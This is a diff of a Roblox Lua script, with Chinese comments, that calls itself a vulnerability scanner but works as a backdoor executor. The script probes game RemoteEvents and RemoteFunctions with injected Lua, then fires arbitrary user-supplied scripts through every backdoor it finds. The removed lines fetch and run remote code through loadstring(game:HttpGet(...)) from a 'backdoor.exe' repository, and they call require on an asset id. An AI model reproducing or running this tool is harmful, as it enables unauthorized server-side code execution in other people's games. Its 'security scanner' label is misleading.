@@ -1,304 +1,324 @@
--- 优化版安全扫描工具 - 增强兼容性和检测能力
+-- 漏洞扫描
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
-local Lighting = game:GetService("Lighting")
 local Workspace = game:GetService("Workspace")
-local JointsService = game:GetService("JointsService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
 local ServerScriptService = game:GetService("ServerScriptService")
-local ServerStorage = game:GetService("ServerStorage")
-local StarterPlayer = game:GetService("StarterPlayer")
+local HttpService = game:GetService("HttpService")
 local StarterGui = game:GetService("StarterGui")
-local TextService = game:GetService("TextService")
+local Lighting = game:GetService("Lighting")
 
--- 变量
 local LocalPlayer = Players.LocalPlayer
-local RobloxGui = CoreGui:FindFirstChild("RobloxGui")
 
--- 函数缓存
-local tableFind = table.find
-local taskSpawn = task.spawn or spawn
-local taskWait = task.wait or wait
-local mathRandom = math.random
-local stringFormat = string.format
-
--- 全局状态
-local attached = false
-local backdoor = nil
-local scanInProgress = false
-
--- 扩展扫描位置
-local scanLocations = {
-    ReplicatedStorage,
-    Workspace,
-    Lighting,
-    ServerScriptService,
-    ServerStorage,
-    StarterPlayer,
-    StarterGui,
-    CoreGui,
-    Players
-}
-
--- 远程对象过滤
-local excludeLocations = {
-    [JointsService] = true,
-    [RobloxReplicatedStorage] = true
-}
-
--- 常量
-local INV_CODE = "xJHCqm84cW"
-local STRING_VALUE_NAME = tostring(mathRandom(1000000, 9999999))
-
--- 清理之前的实例
-if RobloxGui and RobloxGui:FindFirstChild("V6") then
-    RobloxGui.V6:Destroy()
-end
-
--- 安全加载UI
-local Variables
-local success, err = pcall(function()
-    Variables = loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/indev/ui.lua"))()
-end)
-
-if not success then
-    -- 备用UI方案
-    warn("UI加载失败，使用基础界面: " .. tostring(err))
-    Variables = {
-        UI = {
-            Main = {
-                Active = true,
-                Draggable = true,
-                Position = UDim2.new(0.3, 0, 0.3, 0)
-            },
-            Destroy = function() end
-        },
-        Topbar = {
-            Status = {Text = "Ready"},
-            CloseButton = {MouseButton1Click = {Connect = function() end}},
-            R6Button = {MouseButton1Click = {Connect = function() end}},
-            Status = {
-                Text = "Ready",
-                Circle = {
-                    Status_Color = {
-                        BackgroundColor3 = Color3.fromRGB(255, 255, 0)
-                    }
-                }
-            }
-        },
-        MainButtons = {
-            ScanButton = {MouseButton1Click = {Connect = function() end}},
-            ExecuteButton = {MouseButton1Click = {Connect = function() end}},
-            ClearButton = {MouseButton1Click = {Connect = function() end}},
-            HideButton = {MouseButton1Click = {Connect = function() end}},
-            InviteButton = {MouseButton1Click = {Connect = function() end}}
-        },
-        SourceFrame = {
-            Source = {
-                Text = "",
-                Visible = true
-            }
+-- 创建主界面
+local function createScannerUI()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "VulnerabilityScanner"
+    screenGui.Parent = CoreGui
+    
+    -- 主窗口
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 400, 0, 500)
+    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -250)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Active = true
+    mainFrame.Draggable = true
+    mainFrame.Parent = screenGui
+    
+    -- 标题栏
+    local titleBar = Instance.new("Frame")
+    titleBar.Size = UDim2.new(1, 0, 0, 30)
+    titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    titleBar.BorderSizePixel = 0
+    titleBar.Parent = mainFrame
+    
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Size = UDim2.new(1, -60, 1, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = "漏洞扫描执行器 v2.1"
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.TextSize = 14
+    titleLabel.Parent = titleBar
+    
+    local closeButton = Instance.new("TextButton")
+    closeButton.Size = UDim2.new(0, 30, 0, 30)
+    closeButton.Position = UDim2.new(1, -30, 0, 0)
+    closeButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+    closeButton.Text = "X"
+    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeButton.Parent = titleBar
+    
+    -- 状态指示器
+    local statusFrame = Instance.new("Frame")
+    statusFrame.Size = UDim2.new(0.9, 0, 0, 60)
+    statusFrame.Position = UDim2.new(0.05, 0, 0.08, 0)
+    statusFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
+    statusFrame.BorderSizePixel = 0
+    statusFrame.Parent = mainFrame
+    
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, 0, 0.6, 0)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "准备扫描"
+    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.TextSize = 16
+    statusLabel.Parent = statusFrame
+    
+    local statusLight = Instance.new("Frame")
+    statusLight.Size = UDim2.new(0, 20, 0, 20)
+    statusLight.Position = UDim2.new(0.5, -10, 0.7, 0)
+    statusLight.BackgroundColor3 = Color3.fromRGB(255, 255, 0) -- 黄色准备状态
+    statusLight.BorderSizePixel = 0
+    statusLight.Parent = statusFrame
+    
+    -- 控制按钮区域
+    local controlsFrame = Instance.new("Frame")
+    controlsFrame.Size = UDim2.new(0.9, 0, 0, 120)
+    controlsFrame.Position = UDim2.new(0.05, 0, 0.22, 0)
+    controlsFrame.BackgroundTransparency = 1
+    controlsFrame.Parent = mainFrame
+    
+    -- 扫描按钮
+    local scanButton = Instance.new("TextButton")
+    scanButton.Size = UDim2.new(1, 0, 0, 35)
+    scanButton.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
+    scanButton.Text = "开始漏洞扫描"
+    scanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    scanButton.Font = Enum.Font.Gotham
+    scanButton.TextSize = 14
+    scanButton.Parent = controlsFrame
+    
+    -- 快速检测按钮
+    local quickScanButton = Instance.new("TextButton")
+    quickScanButton.Size = UDim2.new(1, 0, 0, 35)
+    quickScanButton.Position = UDim2.new(0, 0, 0, 40)
+    quickScanButton.BackgroundColor3 = Color3.fromRGB(80, 160, 80)
+    quickScanButton.Text = "快速检测"
+    quickScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    quickScanButton.Font = Enum.Font.Gotham
+    quickScanButton.TextSize = 14
+    quickScanButton.Parent = controlsFrame
+    
+    -- 深度扫描按钮
+    local deepScanButton = Instance.new("TextButton")
+    deepScanButton.Size = UDim2.new(1, 0, 0, 35)
+    deepScanButton.Position = UDim2.new(0, 0, 0, 80)
+    deepScanButton.BackgroundColor3 = Color3.fromRGB(180, 80, 80)
+    deepScanButton.Text = "深度扫描"
+    deepScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    deepScanButton.Font = Enum.Font.Gotham
+    deepScanButton.TextSize = 14
+    deepScanButton.Parent = controlsFrame
+    
+    -- 脚本输入区域
+    local scriptFrame = Instance.new("Frame")
+    scriptFrame.Size = UDim2.new(0.9, 0, 0, 180)
+    scriptFrame.Position = UDim2.new(0.05, 0, 0.45, 0)
+    scriptFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
+    scriptFrame.BorderSizePixel = 0
+    scriptFrame.Parent = mainFrame
+    
+    local scriptLabel = Instance.new("TextLabel")
+    scriptLabel.Size = UDim2.new(1, 0, 0, 25)
+    scriptLabel.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
+    scriptLabel.Text = "执行脚本:"
+    scriptLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    scriptLabel.Font = Enum.Font.Gotham
+    scriptLabel.TextSize = 12
+    scriptLabel.Parent = scriptFrame
+    
+    local scriptBox = Instance.new("TextBox")
+    scriptBox.Size = UDim2.new(1, -10, 1, -35)
+    scriptBox.Position = UDim2.new(0, 5, 0, 25)
+    scriptBox.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+    scriptBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    scriptBox.Text = "print('测试脚本执行')"
+    scriptBox.MultiLine = true
+    scriptBox.TextWrapped = true
+    scriptBox.TextXAlignment = Enum.TextXAlignment.Left
+    scriptBox.TextYAlignment = Enum.TextYAlignment.Top
+    scriptBox.Font = Enum.Font.Code
+    scriptBox.TextSize = 12
+    scriptBox.Parent = scriptFrame
+    
+    -- 执行控制区域
+    local executeFrame = Instance.new("Frame")
+    executeFrame.Size = UDim2.new(0.9, 0, 0, 80)
+    executeFrame.Position = UDim2.new(0.05, 0, 0.85, 0)
+    executeFrame.BackgroundTransparency = 1
+    executeFrame.Parent = mainFrame
+    
+    local executeButton = Instance.new("TextButton")
+    executeButton.Size = UDim2.new(0.48, 0, 0, 35)
+    executeButton.BackgroundColor3 = Color3.fromRGB(215, 80, 80)
+    executeButton.Text = "执行脚本"
+    executeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    executeButton.Font = Enum.Font.GothamBold
+    executeButton.TextSize = 14
+    executeButton.Parent = executeFrame
+    
+    local clearButton = Instance.new("TextButton")
+    clearButton.Size = UDim2.new(0.48, 0, 0, 35)
+    clearButton.Position = UDim2.new(0.52, 0, 0, 0)
+    clearButton.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
+    clearButton.Text = "清空"
+    clearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    clearButton.Font = Enum.Font.Gotham
+    clearButton.TextSize = 14
+    clearButton.Parent = executeFrame
+    
+    local resultLabel = Instance.new("TextLabel")
+    resultLabel.Size = UDim2.new(1, 0, 0, 35)
+    resultLabel.Position = UDim2.new(0, 0, 0, 45)
+    resultLabel.BackgroundTransparency = 1
+    resultLabel.Text = "就绪"
+    resultLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    resultLabel.Font = Enum.Font.Gotham
+    resultLabel.TextSize = 12
+    resultLabel.Parent = executeFrame
+    
+    return {
+        UI = screenGui,
+        Elements = {
+            statusLabel = statusLabel,
+            statusLight = statusLight,
+            scanButton = scanButton,
+            quickScanButton = quickScanButton,
+            deepScanButton = deepScanButton,
+            scriptBox = scriptBox,
+            executeButton = executeButton,
+            clearButton = clearButton,
+            resultLabel = resultLabel,
+            closeButton = closeButton
         }
     }
 end
 
--- 确保UI可拖动
-if Variables and Variables.UI and Variables.UI.Main then
-    Variables.UI.Main.Active = true
-    Variables.UI.Main.Draggable = true
-end
+-- 初始化扫描器
+local Scanner = createScannerUI()
+local scanInProgress = false
+local detectedVulnerabilities = {}
 
 -- 通知函数
-local function notify(text, callback, button1, button2)
-    local success, result = pcall(function()
+local function notify(message)
+    pcall(function()
         StarterGui:SetCore("SendNotification", {
-            Title = "Security Scanner",
-            Duration = 3,
-            Text = text,
-            Callback = callback,
-            Button1 = button1,
-            Button2 = button2
+            Title = "漏洞扫描器",
+            Text = message,
+            Duration = 3
         })
     end)
-    
-    if not success then
-        warn("通知发送失败: " .. tostring(result))
-    end
+    Scanner.Elements.resultLabel.Text = message
 end
 
--- 改进的远程对象验证
-local function validRemote(remote)
-    if not remote or not remote.Parent then 
-        return false 
-    end
-    
-    local remoteClass = remote.ClassName
-    if remoteClass ~= "RemoteEvent" and remoteClass ~= "RemoteFunction" then
+-- 更新状态
+local function updateStatus(text, color)
+    Scanner.Elements.statusLabel.Text = text
+    Scanner.Elements.statusLight.BackgroundColor3 = color
+end
+
+-- 检测远程对象
+local function checkRemoteObject(obj)
+    if obj.ClassName ~= "RemoteEvent" and obj.ClassName ~= "RemoteFunction" then
         return false
     end
     
-    -- 排除系统远程对象
-    local parent = remote.Parent
-    if excludeLocations[parent] then
+    -- 排除系统对象
+    if obj:IsDescendantOf(game:GetService("RobloxReplicatedStorage")) then
         return false
     end
     
-    if remote:IsDescendantOf(RobloxReplicatedStorage) then
-        return false
-    end
-    
-    -- 排除特定模式的远程对象
-    local remoteName = remote.Name:lower()
-    local suspiciousNames = {
-        "admin", "kick", "ban", "crash", "execute", 
-        "script", "backdoor", "hack", "exploit"
+    -- 检查可疑名称模式
+    local name = obj.Name:lower()
+    local suspiciousPatterns = {
+        "admin", "execute", "script", "command", "backdoor",
+        "hack", "exploit", "remote", "server", "client"
     }
     
-    for _, name in ipairs(suspiciousNames) do
-        if remoteName:find(name) then
-            return true -- 这些可能是漏洞点，需要扫描
+    for _, pattern in ipairs(suspiciousPatterns) do
+        if name:find(pattern) then
+            return true
         end
     end
     
-    -- 默认扫描所有非系统远程对象
-    return true
+    return false
 end
 
--- 改进的扫描函数
-local function scanLocation(location)
-    if not location or excludeLocations[location] then 
-        return false 
+-- 测试漏洞
+local function testVulnerability(remote)
+    local testId = "Test_" .. tostring(math.random(10000, 99999))
+    
+    -- 测试方法1: 基本代码执行
+    local testCode1 = string.format(
+        "local p=Instance.new('Part',workspace)p.Name='%s'",
+        testId
+    )
+    
+    local success1 = pcall(function()
+        if remote.ClassName == "RemoteEvent" then
+            remote:FireServer(testCode1)
+        else
+            remote:InvokeServer(testCode1)
+        end
+    end)
+    
+    if success1 then
+        wait(0.5)
+        if Workspace:FindFirstChild(testId) then
+            Workspace:FindFirstChild(testId):Destroy()
+            return true
+        end
     end
     
-    local foundVulnerability = false
+    -- 测试方法2: 字符串值创建
+    local testCode2 = string.format(
+        "local s=Instance.new('StringValue',workspace)s.Name='%s's.Value='SUCCESS'",
+        testId
+    )
     
-    -- 扫描所有后代
-    local descendants = location:GetDescendants()
-    for _, descendant in ipairs(descendants) do
+    local success2 = pcall(function()
+        if remote.ClassName == "RemoteEvent" then
+            remote:FireServer(testCode2)
+        else
+            remote:InvokeServer(testCode2)
+        end
+    end)
+    
+    if success2 then
+        wait(0.5)
+        local testObj = Workspace:FindFirstChild(testId)
+        if testObj and testObj.Value == "SUCCESS" then
+            testObj:Destroy()
+            return true
+        end
+    end
+    
+    return false
+end
+
+-- 扫描位置
+local function scanLocation(location, scanType)
+    local found = 0
+    local objects = location:GetDescendants()
+    
+    for _, obj in ipairs(objects) do
         if not scanInProgress then break end
         
-        if validRemote(descendant) then
-            -- 尝试多种检测方法
-            local testMethods = {
-                function(remote)
-                    local testCode = stringFormat(
-                        "if workspace:FindFirstChild('%s') then workspace['%s']:Destroy() end",
-                        STRING_VALUE_NAME, STRING_VALUE_NAME
-                    )
-                    
-                    if remote.ClassName == "RemoteEvent" then
-                        remote:FireServer(testCode)
-                    else
-                        pcall(function() remote:InvokeServer(testCode) end)
-                    end
-                    return workspace:FindFirstChild(STRING_VALUE_NAME) == nil
-                end,
+        if checkRemoteObject(obj) then
+            if testVulnerability(obj) then
+                table.insert(detectedVulnerabilities, {
+                    object = obj,
+                    location = location:GetFullName(),
+                    type = obj.ClassName
+                })
+                found = found + 1
                 
-                function(remote)
-                    local remoteCode = tostring(mathRandom(100000, 999999))
-                    local testScript = stringFormat(
-                        "local s=Instance.new('StringValue',workspace)s.Name='%s's.Value='%s'",
-                        STRING_VALUE_NAME, remoteCode
-                    )
-                    
-                    if remote.ClassName == "RemoteEvent" then
-                        remote:FireServer(testScript)
-                    else
-                        pcall(function() remote:InvokeServer(testScript) end)
-                    end
-                    
-                    local foundObj = workspace:FindFirstChild(STRING_VALUE_NAME)
-                    if foundObj and foundObj.Value == remoteCode then
-                        foundObj:Destroy()
-                        return true
-                    end
-                    return false
+                if scanType == "quick" then
+                    break -- 快速扫描只找第一个漏洞
                 end
-            }
-            
-            for _, testMethod in ipairs(testMethods) do
-                local success, result = pcall(testMethod, descendant)
-                if success and result then
-                    attached = true
-                    backdoor = descendant
-                    foundVulnerability = true
-                    notify("发现安全漏洞: " .. descendant:GetFullName())
-                    break
-                end
-            end
-            
-            if foundVulnerability then
-                break
-            end
-        end
-    end
-    
-    return foundVulnerability
-end
-
--- 主扫描函数
-local function scanGame()
-    if scanInProgress then
-        notify("扫描正在进行中...")
-        return false
-    end
-    
-    scanInProgress = true
-    attached = false
-    backdoor = nil
-    
-    notify("开始安全扫描...")
-    
-    -- 更新UI状态
-    if Variables.Topbar and Variables.Topbar.Status then
-        Variables.Topbar.Status.Text = "扫描中"
-        if Variables.Topbar.Status.Circle and Variables.Topbar.Status.Circle.Status_Color then
-            Variables.Topbar.Status.Circle.Status_Color.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
-        end
-    end
-    
-    local found = false
-    
-    -- 扫描所有配置的位置
-    for _, location in ipairs(scanLocations) do
-        if not scanInProgress then break end
-        if scanLocation(location) then
-            found = true
-            break
-        end
-    end
-    
-    -- 扫描游戏的其他部分
-    if not found then
-        for _, child in ipairs(game:GetChildren()) do
-            if not scanInProgress then break end
-            if not tableFind(scanLocations, child) and not excludeLocations[child] then
-                if scanLocation(child) then
-                    found = true
-                    break
-                end
-            end
-        end
-    end
-    
-    scanInProgress = false
-    
-    -- 更新结果
-    if found then
-        notify("发现安全漏洞!")
-        if Variables.Topbar and Variables.Topbar.Status then
-            Variables.Topbar.Status.Text = "发现漏洞"
-            if Variables.Topbar.Status.Circle and Variables.Topbar.Status.Circle.Status_Color then
-                Variables.Topbar.Status.Circle.Status_Color.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-            end
-        end
-    else
-        notify("未发现安全漏洞")
-        if Variables.Topbar and Variables.Topbar.Status then
-            Variables.Topbar.Status.Text = "安全"
-            if Variables.Topbar.Status.Circle and Variables.Topbar.Status.Circle.Status_Color then
-                Variables.Topbar.Status.Circle.Status_Color.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
             end
         end
     end
@@ -306,119 +326,118 @@ local function scanGame()
     return found
 end
 
--- 执行脚本函数
-local function executeScript(scriptText)
-    local scriptToExecute = scriptText or (Variables.SourceFrame and Variables.SourceFrame.Source.Text or "")
-    if scriptToExecute == "" then 
-        notify("请输入要执行的脚本")
-        return 
+-- 执行扫描
+local function performScan(scanType)
+    if scanInProgress then
+        notify("扫描正在进行中...")
+        return
     end
     
-    if not attached or not backdoor then
-        local function handleResponse(response)
-            if response == "是" then
-                if scanGame() then
-                    executeScript(scriptToExecute)
-                end
-            end
-        end
+    scanInProgress = true
+    detectedVulnerabilities = {}
+    updateStatus("扫描中...", Color3.fromRGB(255, 255, 0))
+    
+    local scanLocations = {
+        ReplicatedStorage,
+        Workspace,
+        Lighting,
+        ServerScriptService,
+        game:GetService("ServerStorage")
+    }
+    
+    local totalFound = 0
+    
+    -- 执行扫描
+    for _, location in ipairs(scanLocations) do
+        if not scanInProgress then break end
         
-        local bindable = Instance.new("BindableFunction")
-        bindable.OnInvoke = handleResponse
-        notify("未连接到服务器。\n是否扫描漏洞?", bindable, "是", "否")
-        return
-    end
-    
-    local success, errorMsg = pcall(function()
-        if backdoor.ClassName == "RemoteEvent" then
-            backdoor:FireServer(scriptToExecute)
-        elseif backdoor.ClassName == "RemoteFunction" then
-            backdoor:InvokeServer(scriptToExecute)
+        local found = scanLocation(location, scanType)
+        totalFound = totalFound + found
+        
+        if scanType == "quick" and totalFound > 0 then
+            break -- 快速扫描找到第一个就停止
         end
-    end)
-    
-    if not success then
-        notify("执行失败: " .. tostring(errorMsg))
-    else
-        notify("脚本执行完成")
     end
+    
+    scanInProgress = false
+    
+    -- 显示结果
+    if totalFound > 0 then
+        updateStatus("发现 " .. totalFound .. " 个漏洞", Color3.fromRGB(0, 255, 0))
+        notify("发现 " .. totalFound .. " 个安全漏洞!")
+    else
+        updateStatus("未发现漏洞", Color3.fromRGB(255, 0, 0))
+        notify("扫描完成 - 未发现漏洞")
+    end
+    
+    return totalFound
 end
 
--- Discord邀请函数
-local function promptDiscordInvite()
-    local httpService = game:GetService("HttpService")
-    local requestFunction = (syn and syn.request) or (httpService and httpService.request) or http_request
-    
-    if not requestFunction then
-        setclipboard(INV_CODE)
-        notify("邀请码已复制到剪贴板!")
+-- 执行脚本
+local function executeScript()
+    if #detectedVulnerabilities == 0 then
+        notify("未发现可用漏洞，请先扫描")
         return
     end
     
-    local success, result = pcall(function()
-        return requestFunction({
-            Url = "http://127.0.0.1:6463/rpc?v=1",
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json",
-                ["Origin"] = "https://discord.com"
-            },
-            Body = httpService:JSONEncode({
-                cmd = "INVITE_BROWSER",
-                args = {code = INV_CODE},
-                nonce = httpService:GenerateGUID(false)
-            })
-        })
-    end)
-    
-    if not success or (result and result.StatusCode ~= 200) then
-        setclipboard(INV_CODE)
-        notify("邀请码已复制到剪贴板!")
-    else
-        notify("已发送Discord邀请! 请查看Discord。")
+    local scriptText = Scanner.Elements.scriptBox.Text
+    if scriptText == "" then
+        notify("请输入要执行的脚本")
+        return
     end
-end
-
--- 安全连接事件
-local function safeConnect(button, callback)
-    if button and button.MouseButton1Click then
-        local success, conn = pcall(function()
-            return button.MouseButton1Click:Connect(callback)
+    
+    updateStatus("执行中...", Color3.fromRGB(255, 165, 0))
+    
+    local successCount = 0
+    local failCount = 0
+    
+    -- 尝试在所有发现的漏洞上执行
+    for i, vuln in ipairs(detectedVulnerabilities) do
+        local success, result = pcall(function()
+            if vuln.object.ClassName == "RemoteEvent" then
+                vuln.object:FireServer(scriptText)
+            else
+                vuln.object:InvokeServer(scriptText)
+            end
         end)
-        if not success then
-            warn("按钮连接失败: " .. tostring(button))
+        
+        if success then
+            successCount = successCount + 1
+        else
+            failCount = failCount + 1
         end
-        return conn
     end
+    
+    updateStatus("执行完成", Color3.fromRGB(0, 255, 0))
+    notify(string.format("执行结果: %d 成功, %d 失败", successCount, failCount))
 end
 
--- 初始化UI事件
-safeConnect(Variables.Topbar.CloseButton, function()
-    if Variables.UI then
-        Variables.UI:Destroy()
-    end
+-- 绑定事件
+Scanner.Elements.scanButton.MouseButton1Click:Connect(function()
+    performScan("normal")
 end)
 
-safeConnect(Variables.Topbar.R6Button, function()
-    executeScript(stringFormat("require(3041175937):r6('%s')", LocalPlayer.Name))
+Scanner.Elements.quickScanButton.MouseButton1Click:Connect(function()
+    performScan("quick")
 end)
 
-safeConnect(Variables.MainButtons.ScanButton, scanGame)
-safeConnect(Variables.MainButtons.ExecuteButton, executeScript)
-
-safeConnect(Variables.MainButtons.ClearButton, function()
-    if Variables.SourceFrame and Variables.SourceFrame.Source then
-        Variables.SourceFrame.Source.Text = ""
-    end
+Scanner.Elements.deepScanButton.MouseButton1Click:Connect(function()
+    performScan("deep")
 end)
 
-safeConnect(Variables.MainButtons.HideButton, function()
-    if Variables.SourceFrame and Variables.SourceFrame.Source then
-        Variables.SourceFrame.Source.Visible = not Variables.SourceFrame.Source.Visible
-    end
+Scanner.Elements.executeButton.MouseButton1Click:Connect(executeScript)
+
+Scanner.Elements.clearButton.MouseButton1Click:Connect(function()
+    Scanner.Elements.scriptBox.Text = ""
+    notify("已清空脚本")
 end)
 
-safeConnect(Variables.MainButtons.InviteButton, promptDiscordInvite)
+Scanner.Elements.closeButton.MouseButton1Click:Connect(function()
+    Scanner.UI:Destroy()
+end)
 
 -- 初始化完成
-notify("安全扫描工具已加载!\n请负责任地使用此工具。")
+updateStatus("就绪", Color3.fromRGB(255, 255, 0))
+notify("漏洞扫描执行器已加载")
+
+print("漏洞扫描执行器 v2.1 - 已初始化")
